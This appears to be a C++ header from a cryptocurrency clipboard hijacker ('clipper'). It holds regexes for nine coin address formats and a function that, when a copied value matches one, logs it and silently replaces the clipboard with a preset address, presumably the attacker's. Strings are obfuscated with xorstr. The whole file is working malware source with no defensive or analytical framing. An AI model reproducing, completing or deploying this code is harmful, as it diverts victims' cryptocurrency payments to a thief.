#pragma once

char btc_regex[] = "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$";
char ltc_regex[] = "(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)";
char eth_regex[] = "(?:^0x[a-fA-F0-9]{40}$)";
char xmr_regex[] = "(?:^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)";
char xrp_regex[] = "(?:^r[0-9a-zA-Z]{33}$)";
char neo_regex[] = "(?:^A[0-9a-zA-Z]{33}$)";
char bch_regex[] = "((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}";
char doge_regex[] = "(?:^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$)";
char dash_regex[] = "(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)";

void detected(std::string address) {
    log(xorstr("Address: ") + address);
}

void clipper(std::string value)
{
    if (regex_match(value, std::regex(btc_regex)) && m_btc) {
        log(xorstr("Detected: BTC"));
        detected(value);

        set_clipboard_text(btc.c_str());
    }

    if (regex_match(value, std::regex(ltc_regex)) && m_ltc) {
        log(xorstr("Detected: LTC"));
        detected(value);

        set_clipboard_text(ltc.c_str());
    }

    if (regex_match(value, std::regex(doge_regex)) && m_doge) {
        log(xorstr("Detected: DOGE"));
        detected(value);

        set_clipboard_text(doge.c_str());
    }

    if (regex_match(value, std::regex(eth_regex)) && m_eth) {
        log(xorstr("Detected: ETH"));
        detected(value);

        set_clipboard_text(eth.c_str());
    }

    if (regex_match(value, std::regex(xmr_regex)) && m_xmr) {
        log(xorstr("Detected: XMR"));
        detected(value);

        set_clipboard_text(xmr.c_str());
    }

    if (regex_match(value, std::regex(xrp_regex)) && m_xrp) {
        log(xorstr("Detected: XRP"));
        detected(value);

        set_clipboard_text(xrp.c_str());
    }

    if (regex_match(value, std::regex(neo_regex)) && m_neo) {
        log(xorstr("Detected: NEO"));
        detected(value);

        set_clipboard_text(neo.c_str());
    }

    if (regex_match(value, std::regex(dash_regex)) && m_dash) {
        log(xorstr("Detected: DASH"));
        detected(value);

        set_clipboard_text(dash.c_str());
    }

    if (regex_match(value, std::regex(bch_regex)) && m_bch) {
        log(xorstr("Detected: BCH"));
        detected(value);

        set_clipboard_text(bch.c_str());
    }
}